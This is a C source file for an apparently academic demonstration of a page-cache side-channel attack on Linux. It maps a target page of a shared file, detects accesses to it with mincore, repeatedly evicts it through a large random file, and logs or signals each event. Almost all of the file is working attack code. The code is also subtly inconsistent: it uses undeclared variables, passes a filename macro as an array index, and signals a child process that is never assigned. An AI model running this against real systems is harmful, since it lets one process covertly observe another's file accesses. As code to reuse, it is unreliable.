/*-----------------------------------------------------------------------------
 * main.c
 *
 * A program demonstrating the exploitation of a side channel based on
 * virtual memory and shared memory. To run this demo program you should have
 * swapping disabled.
 *
 * Usage: ./ev_chk [targets config file] <-s> <-e executable> <-t file>
 * 
 *  [targets config file]
 *      File containing the target pages from shared files to which accesses
 *      should be monitored.
 * 
 *  -s (optional)
 *      Collects statistics about eviction attempts as csv. 
 *      (accessed eviction memory -> "histogram_mem.csv", 
 *      eviction runtime -> "histogram_time.csv") 
 * 
 *  -e executable (optional) 
 *      Allows to specify an executable which is signaled in case of 
 *      an detected event (SIGUSR1).
 * 
 *  -t file (optional)
 *      Collects information about detected events as csv.
 *      (count, timestamp, eviction runtime, accessed eviction memory)
 *
 * NOTE For evaluation with the attack working set enabled the attacker binary should be stored
 *      somewhere in the search paths so that it is also added to the attack working set.
 * 
 * Erik Kraft
 */

// needed to support additional features
#define _GNU_SOURCE
#define _DEFAULT_SOURCE

/*-----------------------------------------------------------------------------
 * INCLUDES
 */
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <fts.h>
#include <memory.h>
#include <pthread.h>
#include <semaphore.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <sys/sysinfo.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>
#include <wait.h>
#include <zconf.h>
#include <assert.h>
#include <limits.h>
#include "cmdline.h"
#include "config.h"
#include "pca.h"
#include "dynarray.h"
#include "list.h"
#include "pageflags.h"
#include "filemap.h"


/*-----------------------------------------------------------------------------
 * DEFINES
 */

// general defines
//#define _DEBUG_
//#define _DETAILED_EVICTION_SET_STAT_
// file names, paths
#define HISTOGRAM_FILENAME_TIME "histogram_time.csv"
#define HISTOGRAM_FILENAME_MEM "histogram_mem.csv"

// defines used for parsing command line arguments
#define SWITCHES_COUNT 4
#define STATISTIC_SWITCH 0
#define EXT_EVENT_APP_SWITCH 1
#define TRACE_SWITCH 2
const char *SWITCHES_STR[SWITCHES_COUNT] = {"-s", "-e", "-t", "-b"};
const size_t SWITCHES_ARG_COUNT[SWITCHES_COUNT] = {0, 1, 1, 2};
#define MANDATORY_ARGS 2
#define TARGET_PATH_ARG 0
#define TARGET_OFFSET_ARG 1
#define USAGE_MSG "Usage: %s [target file] [page to watch] <-s> <-e executable> <-t file>\n\n" \
                  "\t[target file]\n"                                                          \
                  "\t\tThe shared file which contains the page to which accesses\n"            \
                  "\t\tshould be monitored.\n\n"                                               \
                  "\t[page to watch]\n"                                                        \
                  "\t\tThe file offset in pages of the target page.\n\n"                       \
                  "\t-s (optional)\n"                                                          \
                  "\t\tCollects statistics about eviction attempts as csv.\n"                  \
                  "\t\t(accessed eviction memory -> \"histogram_mem.csv\",\n"                  \
                  "\t\teviction runtime -> \"histogram_time.csv\")\n\n"                        \
                  "\t-e executable (optional)\n"                                               \
                  "\t\tAllows to specify an executable which is signaled in case of\n"         \
                  "\t\tan detected event (SIGUSR1).\n\n"                                       \
                  "\t-t file (optional)\n"                                                     \
                  "\t\tCollects information about detected events as csv.\n"                   \
                  "\t\t(count, timestamp, eviction runtime, accessed eviction memory)\n"

// inits/limits for data structures
#define ARRAY_INIT_CAP 10
#define IN_LINE_MAX 255

// output TAGS with ANSI colors
#define PENDING "\x1b[34;1m[PENDING]\x1b[0m "
#define INFO "\x1b[34;1m[INFO]\x1b[0m "
#define EVENT "\x1b[33;1m[EVENT]\x1b[0m "
#define OK "\x1b[32;1m[OK]\x1b[0m "
#define FAIL "\x1b[31;1m[FAIL]\x1b[0m "
#define USAGE "\x1b[31;1m[USAGE]\x1b[0m "
#define WARNING "\x1b[33;1m[WARNING]\x1b[0m "


/*-----------------------------------------------------------------------------
 * FUNCTION PROTOTYPES
 */

void usageError(char *app_name);


/*-----------------------------------------------------------------------------
 * GLOBAL VARIABLES
 */
static int running = 1;

static size_t PAGE_SIZE = 0;


/*-----------------------------------------------------------------------------
 * SIGNAL HANDLERS
 */
void quitHandler(int signal)
{
    // __ATOMIC_RELAXED = no thread ordering constraints
    __atomic_store_n(&running, 0, __ATOMIC_RELAXED);
}



/*-----------------------------------------------------------------------------
 * CODE
 */
// TODO windows pca init add bs flag if started for blocking set
//      same for working set
int main(int argc, char *argv[])
{
    // general variables
    struct sysinfo system_info;
    struct sigaction quit_act = {0};
    int ret = 0;

    // variables used for processing command line arguments
    CmdLineConf cmd_line_conf =
    {
        .mandatory_args_count_ = MANDATORY_ARGS,
        .switches_count_ = SWITCHES_COUNT,
        .switches_ = SWITCHES_STR,
        .switches_arg_count_ = SWITCHES_ARG_COUNT
    };
    CmdLineParsed parsed_cmd_line;
    char *endptr = NULL;

    // variables used for statistics
    size_t mem_accessed = 0, event_mem_accessed = 0, mem_accessed_sum = 0;
    FILE *histogram_time_file = NULL, *histogram_mem_file = NULL, *trace_file = NULL;
    struct timespec eviction_start, eviction_end, unix_epoch;
    size_t elapsed_time_eviction_ns = 0, eviction_time_eviction_sum_ns = 0, event_eviction_time_ns = 0;
    size_t eviction_count = 0;
    size_t event_counter = 0, event_time = 0;

    // variables necessary for general attack function
    size_t target_offset = 0;
    char target_obj_path[PATH_MAX] = {0};
    char eviction_file_path[PATH_MAX] = {0};
    Attack attack = {0};
    FileMapping self_mapping = {0};
    unsigned char target_page_status;
    size_t event_hold = 0;
    pid_t event_child = 0;


    // set output buffering to lines (needed for automated testing)
    setvbuf(stdout, NULL, _IOLBF, 0);

    // process command line arguments
    if (parseCmdArgs(&argv[1], argc - 1, &cmd_line_conf, &parsed_cmd_line) != 0)
    {
        usageError(argv[0]);
        goto error;
    }

    // initialise random generator
    srand(time(NULL));

    // register signal handler for quiting the program by SRTG+C
    quit_act.sa_handler = quitHandler;
    ret = sigaction(SIGINT, &quit_act, NULL);
    ret += sigaction(SIGQUIT, &quit_act, NULL);
    ret += sigaction(SIGUSR1, &quit_act, NULL);
    if (ret != 0)
    {
        printf(FAIL "Error at registering signal handlers...\n");
        goto error;
    }

    // initialising attack structure
    if (initAttack(&attack) != 0)
    {
        printf(FAIL "Error at initialising attack configuration...\n");
        goto error;
    }

    // sample configuration
    configAttack(&attack);

    // get system information
    ret = sysinfo(&system_info);
    if (ret != 0)
    {
        printf(FAIL "Error (%s) at sysinfo...\n", strerror(errno));
        goto error;
    }
    printf(INFO "Total usable ram: %zu\n", system_info.totalram);

    // get system page size
    PAGE_SIZE = sysconf(_SC_PAGESIZE);
    if (PAGE_SIZE == -1)
    {
        printf(FAIL "Error (%s) at syscconf...\n", strerror(errno));
        goto error;
    }
    printf(INFO "System page size: %zu\n", PAGE_SIZE);

    // calculate target page offset in byte
    target_offset = strtoul(parsed_cmd_line.mandatory_args_[TARGET_OFFSET_ARG], &endptr, 10);
    if (endptr == parsed_cmd_line.mandatory_args_[TARGET_OFFSET_ARG] || *endptr != 0 ||
        (target_offset == ULONG_MAX && errno == ERANGE) || target_offset > ULONG_MAX / PAGE_SIZE)
    {
        usageError(argv[0]);
        goto error;
    }
    target_offset *= PAGE_SIZE;

    // optional: mlock self
    if (attack.mlock_self_)
    {
        // map self
        if (mapFile(&self_mapping, argv[0], O_RDONLY, PROT_READ | PROT_EXEC, MAP_PRIVATE) != 0)
        {
            printf(FAIL "Error (%s) at mapFile for: %s ...\n", strerror(errno), argv[0]);
            goto error;
        }

        // mlock self
        ret = mlock(self_mapping.addr_, self_mapping.size_);
        if (ret != 0)
        {
            printf(FAIL "Error (%s) at mlock: %s...\n", strerror(errno), argv[0]);
        }
    }

    // get access path of target object relative to root
    if (realpath(parsed_cmd_line.mandatory_args_[TARGET_PATH_ARG], target_obj_path) == NULL)
    {
        printf(FAIL "Error (%s) at realpath: %s...\n", strerror(errno),
               parsed_cmd_line.mandatory_args_[TARGET_PATH_ARG]);
        goto error;
    }
    // map target object
    if (mapFile(&attack.target_obj_, target_obj_path, O_RDONLY, PROT_READ, MAP_PRIVATE) != 0)
    {
        printf(FAIL "Error (%s) at mapFile for: %s ...\n", strerror(errno), target_obj_path);
        goto error;
    }

    // check if target page is out of bound
    if (target_offset > attack.target_obj_.size_)
    {
        printf(FAIL "Target page out of bound!\n");
        goto error;
    }
    printf(INFO "Target offset: %zx\n", target_offset);
    // save target page and address
    attack.target_page_ = target_offset / PAGE_SIZE;
    attack.target_addr_ = (uint8_t *)attack.target_obj_.addr_ + target_offset;

    // calcualte page addresses in near surrounding of the target page (for suppressing readahead)
    for (size_t p = attack.target_page_ < READAHEAD_PAGES ? 0 : attack.target_page_ - READAHEAD_PAGES;
         p < attack.target_page_; p++)
    {
        void *address = (uint8_t *)attack.target_obj_.addr_ + p * PAGE_SIZE;
        if (!dynArrayAppend(&attack.suppress_set_.target_readahead_window_, &address))
        {
            printf(FAIL "Error at dynArrayAppend...\n");
            goto error;
        }
    }

    // optional: map and mlock event binary
    if (parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0] != NULL)
    {
        // map event binary
        if (mapFile(&attack.event_obj_, parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0],
                    O_RDONLY, PROT_READ | PROT_EXEC, MAP_PRIVATE) != 0)
        {
            printf(FAIL "Error (%s) at mapFile for: %s ...\n", strerror(errno), parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0]);
            goto error;
        }

        ret = mlock(attack.event_obj_.addr_, attack.event_obj_.size_);
        if (ret != 0)
        {
            printf(FAIL "Error (%s) at mlock: %s...\n", strerror(errno), parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0]);
        }

        attack.event_child_ = fork();
        if (attack.event_child_ < 0)
        {
            printf(FAIL "Error (%s) at fork...\n", strerror(errno));
            goto error;
        }
        else if (attack.event_child_ == 0)
        {
            char *event_argv[] = {NULL};
            execv(parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0], event_argv);
            printf(FAIL "Error (%s) at execv: %s\n", strerror(errno), parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0]);
            goto error;
        }
    }

    // create statistic files if wanted
    if (parsed_cmd_line.switch_states_[STATISTIC_SWITCH])
    {
        // create histogram time data file
        histogram_time_file = fopen(HISTOGRAM_FILENAME_TIME, "w");
        if (histogram_time_file == NULL)
        {
            printf(FAIL "Error (%s) at fopen: %s...\n", strerror(errno), HISTOGRAM_FILENAME_TIME);
            goto error;
        }
        ret = fprintf(histogram_time_file, "Sample;Eviction duration (ns)\n");
        if (ret < 0)
        {
            printf(FAIL "Error (%s) at fprintf: %s...\n", strerror(errno), HISTOGRAM_FILENAME_TIME);
            goto error;
        }

        // create histogram mem data file
        histogram_mem_file = fopen(HISTOGRAM_FILENAME_MEM, "w");
        if (histogram_mem_file == NULL)
        {
            printf(FAIL "Error (%s) at fopen: %s...\n", strerror(errno), HISTOGRAM_FILENAME_MEM);
            goto error;
        }
        ret = fprintf(histogram_mem_file, "Sample;Used eviction set (kB)\n");
        if (ret < 0)
        {
            printf(FAIL "Error (%s) at fprintf: %s...\n", strerror(errno), HISTOGRAM_FILENAME_MEM);
            goto error;
        }
    }

    // create trace file
    if (parsed_cmd_line.switch_args_[TRACE_SWITCH][0] != NULL)
    {
        trace_file = fopen(parsed_cmd_line.switch_args_[TRACE_SWITCH][0], "w");
        if (trace_file == NULL)
        {
            printf(FAIL "Error (%s) at fopen: %s...\n", strerror(errno), parsed_cmd_line.switch_args_[TRACE_SWITCH][0]);
            goto error;
        }
        ret = fprintf(trace_file,
                      "Target object: %s\nTarget page: %zu\n"
                      "Event count;Time (ns);Eviction duration (ns);Used eviction set (kB)\n",
                      target_obj_path, target_offset / PAGE_SIZE);
        if (ret < 0)
        {
            printf(FAIL "Error (%s) at fprintf: %s...\n", strerror(errno), parsed_cmd_line.switch_args_[TRACE_SWITCH][0]);
            goto error;
        }
    }

    // create eviction file if it doesn't exist
    printf(PENDING "Trying to create a %zu MB random file.\nThis might take a while...\n", system_info.totalram / 1024 / 1024);
    ret = createRandomFile(EVICTION_FILENAME, system_info.totalram);
    if (ret != 0)
    {
        printf(FAIL "Error(%s) at createRandomFile...\n", strerror(errno));
        goto error;
    }

    // get access path of eviction file relative to root
    if (realpath(parsed_cmd_line.mandatory_args_[EVICTION_FILENAME], eviction_file_path) == NULL)
    {
        printf(FAIL "Error (%s) at realpath: %s...\n", strerror(errno),
               parsed_cmd_line.mandatory_args_[EVICTION_FILENAME]);
        goto error;
    }
    // map eviction file
    if (mapFile(&attack.eviction_set_.mapping_, EVICTION_FILENAME, O_RDONLY, PROT_READ | PROT_EXEC, MAP_PRIVATE) != 0)
    {
        printf(FAIL "Error (%s) at mapFile for: %s ...\n", strerror(errno), EVICTION_FILENAME);
        goto error;
    }

    printf(PENDING "Initialising...\n");
    if (attack.use_attack_ws_)
    {
        printf(PENDING "Profiling working set...\n");
        if (profileAttackWorkingSet(&attack.working_set_, target_obj_path, eviction_file_path) != 0)
        {
            printf(FAIL "Error at profileAttackWorkingSet...\n");
            goto error;
        }

        printf(INFO "%zu files with %zu mapped bytes of sequences bigger than %zu pages are currently resident in memory.\n",
               attack.working_set_.resident_files_.count_, attack.working_set_.mem_in_ws_, attack.working_set_.ps_add_threshold_);
    }

// if wanted use eviction threads
#ifdef ES_USE_THREADS
    if (spawnESThreads(&attack.eviction_set_, attack.target_addr_, attack.mincore_check_all_x_bytes_) != 0)
    {
        printf(FAIL "Error at spawnESThreads...\n");
        goto error;
    }
#endif

    // next thread(s) by default on different core
    CPU_ZERO(&cpu_mask);
    CPU_SET(used_pus, &cpu_mask);
    pthread_attr_setaffinity_np(&thread_attr, sizeof(cpu_set_t), &cpu_mask);
    used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;

    // spawn surpressing set worker threads
    if (spawnSuppressThreads(&attack, &thread_attr) != 0)
    {
        printf(FAIL "Error at spawnSSThreads...\n");
        goto error;
    }

    // manager for working set
    if (attack.use_attack_ws_ && pthread_create(&attack.ws_manager_thread_, &thread_attr, wsManagerThread, &attack.working_set_) != 0)
    {
        printf(FAIL "Error (%s) at pthread_create...\n", strerror(errno));
    }

    // manager for blocking set
    if (attack.use_attack_bs_)
    {
        if (pthread_create(&attack.bs_manager_thread_, &thread_attr, bsManagerThread, &attack.blocking_set_) != 0)
        {
            printf(FAIL "Error (%s) at pthread_create...\n", strerror(errno));
        }
        else
        {
            // wait till blocking set is initialized
            sem_wait(&attack.blocking_set_.initialized_sem_);
        }
    }

    printf(OK "Ready...\n");
    // main event loop
    while (running)
    {
        if (mincore(attack.target_addr_, PAGE_SIZE, &target_page_status) != 0)
        {
            printf(FAIL "Error (%s) at mincore...\n", strerror(errno));
            continue;
        }

        if (clock_gettime(CLOCK_REALTIME, &unix_epoch) != 0)
        {
            printf(FAIL "Error (%s) at clock_gettime...\n", strerror(errno));
        }

        // event detected
        if (target_page_status & 1)
        {
            if (!event_hold)
            {
                event_hold = 1;
                event_eviction_time_ns = 0;
                event_mem_accessed = 0;
                event_counter++;

                printf(EVENT "%zu. event fired! Unix epoch timestamp: %zu s %zu us\n", event_counter, unix_epoch.tv_sec,
                       unix_epoch.tv_nsec / 1000);

                // send signal to event process
                if (event_child != 0)
                {
                    nanosleep(&attack.event_wait_time_, NULL);

                    if (kill(event_child, SIGUSR1) != 0)
                    {
                        printf(FAIL "Error (%s) at signaling event process...\n", strerror(errno));
                    }

                    sched_yield();
                }
            }

            // trying to evict
            ret = clock_gettime(CLOCK_MONOTONIC, &eviction_start);
            mem_accessed = evictTargetPage(&attack);
            ret += clock_gettime(CLOCK_MONOTONIC, &eviction_end);

            if (ret != 0)
            {
                printf(FAIL "Error (%s) at clock_gettime...\n", strerror(errno));
            }
            else
            {
                // eviction time of single try
                elapsed_time_eviction_ns = (eviction_end.tv_sec - eviction_start.tv_sec) * 1000000000UL +
                                           (eviction_end.tv_nsec - eviction_start.tv_nsec);
                // sum of all evivtion times
                eviction_time_eviction_sum_ns += elapsed_time_eviction_ns;
                // eviction time per event
                event_eviction_time_ns += elapsed_time_eviction_ns;
                // sum of all accessed memory 
                mem_accessed_sum += mem_accessed;
                // accessed memory per event
                event_mem_accessed += mem_accessed;

                DEBUG_PRINT((DEBUG "Accessed approx. %zu kB of eviction memory (elapsed time %zu)..\n",
                             mem_accessed / 1024, elapsed_time_eviction_ns));

                // write statistical data
                if (parsed_cmd_line.switch_states_[STATISTIC_SWITCH])
                {
                    fprintf(histogram_time_file, "%zu;%zu\n", eviction_count, elapsed_time_eviction_ns);
                    fprintf(histogram_mem_file, "%zu;%zu\n", eviction_count, mem_accessed / 1024);
                }
            }

            eviction_count++;
        }
        else if (!(target_page_status & 1) && event_hold)
        {
            printf(EVENT "Released (eviction took %zu us, accessed %zu kB)\n\n", event_eviction_time_ns / 1000,
                   event_mem_accessed / 1024);

            if (parsed_cmd_line.switch_states_[TRACE_SWITCH])
            {
                fprintf(trace_file, "%zu;%zu;%zu;%zu\n", event_counter, event_time, event_eviction_time_ns, event_mem_accessed / 1024);
            }

            event_hold = 0;
        }

        sched_yield();
    }

    if (event_counter > 0)
    {
        printf(INFO "Mean time to eviction per event: %f ns..\n", (double)eviction_time_eviction_sum_ns / event_counter);
        printf(INFO "Mean accessed eviction set per event: %f kB..\n", (double)mem_accessed_sum / 1024 / event_counter);
    }

    goto cleanup;

error:
    ret = -1;

cleanup:

    pthread_attr_destroy(&thread_attr);

    exitAttack(&attack);
    if (attack.mlock_self_)
    {
        closeFileMapping(&self_mapping);
    }

    if (trace_file != NULL)
    {
        fclose(trace_file);
    }
    if (histogram_time_file != NULL)
    {
        fclose(histogram_time_file);
    }
    if (histogram_mem_file != NULL)
    {
        fclose(histogram_mem_file);
    }

    freeCmdLineParsed(&cmd_line_conf, &parsed_cmd_line);

    return ret;
}

// TODO update config
void pcaConfigFromDefines(Attack *attack)
{
    // configure attack from defines
    attack->use_attack_ws_ |= DEF_USE_ATTACK_WS;
    attack->use_attack_bs_ |= DEF_USE_ATTACK_BS;
    attack->mlock_self_ |= DEF_MLOCK_SELF;

    // only used if ES_USE_THREADS is defined
    attack->eviction_set_.access_thread_count_ = DEF_ES_ACCESS_THREAD_COUNT;
    attack->eviction_set_.access_threads_per_pu_ = DEF_ES_ACCESS_THREADS_PER_PU;

    attack->working_set_.evaluation_ |= DEF_WS_EVALUATION;
    attack->working_set_.eviction_ignore_evaluation_ |= DEF_WS_EVICTION_IGNORE_EVALUATION;
    attack->working_set_.search_paths_ = DEF_WS_SEARCH_PATHS;
    attack->working_set_.ps_add_threshold_ = DEF_WS_PS_ADD_THRESHOLD;
    attack->working_set_.access_thread_count_ = DEF_WS_ACCESS_THREAD_COUNT;
    attack->working_set_.access_threads_per_pu_ = DEF_WS_ACCESS_THREADS_PER_PU;
    attack->working_set_.access_sleep_time_.tv_sec = DEF_WS_ACCESS_SLEEP_TIME_S;
    attack->working_set_.access_sleep_time_.tv_nsec = DEF_WS_ACCESS_SLEEP_TIME_NS;
    attack->working_set_.evaluation_sleep_time_.tv_sec = DEF_WS_EVALUATION_SLEEP_TIME_S;
    attack->working_set_.evaluation_sleep_time_.tv_nsec = DEF_WS_EVALUATION_SLEEP_TIME_NS;
    attack->working_set_.profile_update_all_x_evaluations_ = DEF_WS_PROFILE_UPDATE_ALL_X_EVALUATIONS;

    attack->mincore_check_all_x_bytes_ = DEF_MINCORE_CHECK_ALL_X_BYTES;

    attack->blocking_set_.meminfo_file_path_ = DEF_BS_MEMINFO_FILE_PATH;
    attack->blocking_set_.def_fillup_size_ = DEF_BS_FILLUP_SIZE;
    attack->blocking_set_.min_available_mem_ = DEF_BS_MIN_AVAILABLE_MEM;
    attack->blocking_set_.max_available_mem_ = DEF_BS_MAX_AVAILABLE_MEM;
    attack->blocking_set_.evaluation_sleep_time_.tv_sec = DEF_BS_EVALUATION_SLEEP_TIME_S;
    attack->blocking_set_.evaluation_sleep_time_.tv_nsec = DEF_BS_EVALUATION_SLEEP_TIME_NS;

    attack->ss_thread_count_ = DEF_SS_THREAD_COUNT;

    attack->sample_wait_time_.tv_sec = 0;
    attack->sample_wait_time_.tv_nsec = DEF_SAMPLE_WAIT_TIME_NS;
    attack->event_wait_time_.tv_sec = 0;
    attack->event_wait_time_.tv_nsec = DEF_EVENT_WAIT_TIME_NS;
}

void usageError(char *app_name)
{
    printf(USAGE USAGE_MSG, app_name);
}
